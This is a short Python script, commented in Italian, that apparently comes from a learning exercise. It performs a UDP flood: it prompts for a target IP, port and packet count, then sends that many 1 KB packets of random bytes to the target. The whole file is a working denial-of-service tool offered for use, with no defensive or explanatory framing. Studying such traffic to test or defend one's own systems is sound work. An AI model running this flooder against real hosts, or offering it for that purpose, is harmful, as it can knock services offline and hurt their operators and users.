import socket                                                                           #importo moduli e librerie per creare socket e bytes casuali
from random import randbytes

print("Questo programma effettua un UDP flood")

ipTarget = input("Inserisci l'IP che vuoi attaccare: ")

while True:
    try:                                                                                #gestisco gli errori di inserimento da parte dell'utente
        portaTarget = int(input("Inserisci su quale porta vuoi attaccare (1-65535): "))
        if 1 <= portaTarget <= 65535:
            break
        else:
            print("Errore: La porta deve essere un numero tra 1 e 65535\n")
    except ValueError:
        print("Errore: Inserisci un numero valido\n")


dimPacchetti = 1024                                                                     #1KB dimensione del pacchetto                                                     
numPacchetti = int(input("Inserisci il numero di pacchetti che vuoi inviare: "))        #numero di pacchetti che voglio inviare


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                                    #creazione socket

randomBytes = randbytes(dimPacchetti)                                                   #genero una sequenza casuale di bytes

print(f"Sto inviando {numPacchetti} pacchetti UDP di dimensione {dimPacchetti} bytes all'indirizzo: {ipTarget}:{portaTarget} \n")

for i in range(numPacchetti):
    s.sendto(randomBytes, (ipTarget, portaTarget))                                       #ciclo for che mi invia i pacchetti fino al numero inserito dall'utente
    print(f"Pacchetto {i+1} inviato")

print("UDP flood completato")                                                            #fine